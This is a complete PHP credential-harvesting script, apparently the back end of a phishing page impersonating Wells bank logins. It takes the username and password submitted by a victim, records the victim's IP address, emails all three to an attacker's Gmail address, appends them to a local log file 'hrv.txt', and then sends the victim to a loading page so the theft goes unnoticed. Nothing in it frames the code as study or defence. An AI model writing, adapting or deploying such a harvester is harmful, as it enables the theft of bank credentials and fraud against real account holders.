<?php
session_start();
$username = $_POST['username'];
$password = $_POST['password'];
$_SESSION['username'] = $username;
$_SESSION['password'] = $password;
$ip = getenv("REMOTE_ADDR");

$subj = "Wells User - $username";
$msg = "Uid: $username | Password: $password | IP: $ip
";

mail("@gmail.com", $subj, $msg);

$pula = fopen ("hrv.txt" , "a");
fwrite ($pula , $msg);
fclose ($pula);

header("Location: loading.html");
?>